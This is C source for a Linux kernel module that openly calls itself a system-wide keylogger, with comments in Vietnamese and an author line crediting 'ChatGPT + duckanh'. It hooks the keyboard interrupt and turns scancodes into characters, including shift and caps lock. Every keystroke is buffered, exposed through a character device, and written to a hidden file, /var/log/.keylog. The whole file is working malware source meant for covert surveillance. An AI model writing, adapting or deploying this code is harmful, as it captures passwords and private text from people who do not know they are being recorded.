#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/workqueue.h>
#include <linux/wait.h>
#include <linux/fcntl.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/interrupt.h>
#include <asm/io.h>

#define DEVICE_NAME "keylogger"
#define BUF_SIZE 1024
#define LOG_PATH "/var/log/.keylog"

#define I8042_KBD_IRQ 1
#define I8042_DATA_REG 0x60
#define SCANCODE_RELEASED_MASK 0x80

static dev_t dev_num;
static struct cdev keylogger_cdev;
static struct class *keylogger_class;

static char keybuf[BUF_SIZE];
static int head = 0, tail = 0;
static DEFINE_SPINLOCK(buf_lock);
static DECLARE_WAIT_QUEUE_HEAD(keylogger_wq);

static struct work_struct keylogger_work;
static char pending_key;

static struct file *log_file;

// Trạng thái phím
static bool left_shift_pressed = false;
static bool right_shift_pressed = false;
static bool caps_lock_active = false;

// Bảng ánh xạ scancode sang ký tự (QWERTY)
struct key_map {
    unsigned char scancode;
    char normal;
    char shifted;
};

static const struct key_map keymap[] = {
    {0x02, '1', '!'},
    {0x03, '2', '@'},
    {0x04, '3', '#'},
    {0x05, '4', '$'},
    {0x06, '5', '%'},
    {0x07, '6', '^'},
    {0x08, '7', '&'},
    {0x09, '8', '*'},
    {0x0a, '9', '('},
    {0x0b, '0', ')'},
    {0x10, 'q', 'Q'},
    {0x11, 'w', 'W'},
    {0x12, 'e', 'E'},
    {0x13, 'r', 'R'},
    {0x14, 't', 'T'},
    {0x15, 'y', 'Y'},
    {0x16, 'u', 'U'},
    {0x17, 'i', 'I'},
    {0x18, 'o', 'O'},
    {0x19, 'p', 'P'},
    {0x1e, 'a', 'A'},
    {0x1f, 's', 'S'},
    {0x20, 'd', 'D'},
    {0x21, 'f', 'F'},
    {0x22, 'g', 'G'},
    {0x23, 'h', 'H'},
    {0x24, 'j', 'J'},
    {0x25, 'k', 'K'},
    {0x26, 'l', 'L'},
    {0x2c, 'z', 'Z'},
    {0x2d, 'x', 'X'},
    {0x2e, 'c', 'C'},
    {0x2f, 'v', 'V'},
    {0x30, 'b', 'B'},
    {0x31, 'n', 'N'},
    {0x32, 'm', 'M'},
    {0x39, ' ', ' '},
    {0x1c, '\n', '\n'},
    {0, 0, 0} // Kết thúc bảng
};

static char scancode_to_char(unsigned char scancode) {
    bool shift_active = left_shift_pressed || right_shift_pressed;

    for (int i = 0; keymap[i].scancode; i++) {
        if (keymap[i].scancode == scancode) {
            if (keymap[i].normal == 0) return 0;

            // Kiểm tra xem phím có phải là chữ cái (a-z)
            bool is_letter = (keymap[i].normal >= 'a' && keymap[i].normal <= 'z');
            // Áp dụng Caps Lock chỉ cho chữ cái
            bool use_shifted = shift_active || (is_letter && caps_lock_active);

            return use_shifted ? keymap[i].shifted : keymap[i].normal;
        }
    }
    return '?';
}

static void keylogger_work_func(struct work_struct *work) {
    unsigned long flags;
    char c = pending_key;

    if (c == 0) return;

    spin_lock_irqsave(&buf_lock, flags);
    keybuf[head] = c;
    head = (head + 1) % BUF_SIZE;
    if (head == tail)
        tail = (tail + 1) % BUF_SIZE;
    spin_unlock_irqrestore(&buf_lock, flags);

    wake_up_interruptible(&keylogger_wq);

    if (log_file) {
        loff_t pos = 0;
        kernel_write(log_file, &c, 1, &pos);
    }
}

static irqreturn_t irq_handler(int irq, void *dev_id) {
    unsigned long flags;
    unsigned char scancode = inb(I8042_DATA_REG);
    unsigned char keycode = scancode & ~SCANCODE_RELEASED_MASK;
    bool is_pressed = !(scancode & SCANCODE_RELEASED_MASK);

    // Xử lý phím Shift
    if (keycode == 0x2a) { // Left Shift
        left_shift_pressed = is_pressed;
        return IRQ_HANDLED;
    }
    if (keycode == 0x36) { // Right Shift
        right_shift_pressed = is_pressed;
        return IRQ_HANDLED;
    }

    // Xử lý Caps Lock
    if (keycode == 0x3a && is_pressed) {
        caps_lock_active = !caps_lock_active;
        return IRQ_HANDLED;
    }

    // Xử lý phím thông thường (chỉ khi nhấn)
    if (is_pressed) {
        spin_lock_irqsave(&buf_lock, flags);
        pending_key = scancode_to_char(keycode);
        spin_unlock_irqrestore(&buf_lock, flags);
        if (pending_key) {
            schedule_work(&keylogger_work);
        }
    }

    return IRQ_HANDLED;
}

static ssize_t keylogger_read(struct file *file, char __user *buf, size_t len, loff_t *off) {
    int copied = 0;
    unsigned long flags;

    if (wait_event_interruptible(keylogger_wq, tail != head))
        return -ERESTARTSYS;

    spin_lock_irqsave(&buf_lock, flags);
    while (tail != head && copied < len) {
        if (put_user(keybuf[tail], buf + copied)) {
            spin_unlock_irqrestore(&buf_lock, flags);
            return -EFAULT;
        }
        tail = (tail + 1) % BUF_SIZE;
        copied++;
    }
    spin_unlock_irqrestore(&buf_lock, flags);

    return copied;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keylogger_read,
};

static int __init keylogger_init(void) {
    int ret;

    log_file = filp_open(LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(log_file)) {
        printk(KERN_ERR "Failed to open keylog file\n");
        log_file = NULL;
    }

    INIT_WORK(&keylogger_work, keylogger_work_func);
    spin_lock_init(&buf_lock);

    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0) return ret;

    cdev_init(&keylogger_cdev, &fops);
    ret = cdev_add(&keylogger_cdev, dev_num, 1);
    if (ret < 0) goto unregister_dev;

    keylogger_class = class_create(DEVICE_NAME);
    if (IS_ERR(keylogger_class)) {
        ret = PTR_ERR(keylogger_class);
        goto del_cdev;
    }

    if (!device_create(keylogger_class, NULL, dev_num, NULL, DEVICE_NAME)) {
        ret = -EINVAL;
        goto destroy_class;
    }

    ret = request_irq(I8042_KBD_IRQ, irq_handler, IRQF_SHARED, DEVICE_NAME, (void *)irq_handler);
    if (ret) {
        printk(KERN_ERR "Failed to request IRQ\n");
        goto destroy_class;
    }

    printk(KERN_INFO "Keylogger loaded (IRQ based).\n");
    return 0;

destroy_class:
    class_destroy(keylogger_class);
del_cdev:
    cdev_del(&keylogger_cdev);
unregister_dev:
    unregister_chrdev_region(dev_num, 1);
    return ret;
}

static void __exit keylogger_exit(void) {
    free_irq(I8042_KBD_IRQ, (void *)irq_handler);
    flush_work(&keylogger_work);
    device_destroy(keylogger_class, dev_num);
    class_destroy(keylogger_class);
    cdev_del(&keylogger_cdev);
    unregister_chrdev_region(dev_num, 1);

    if (log_file)
        filp_close(log_file, NULL);

    printk(KERN_INFO "Keylogger unloaded.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ChatGPT + duckanh");
MODULE_DESCRIPTION("IRQ-based system-wide keylogger with char device + log file");
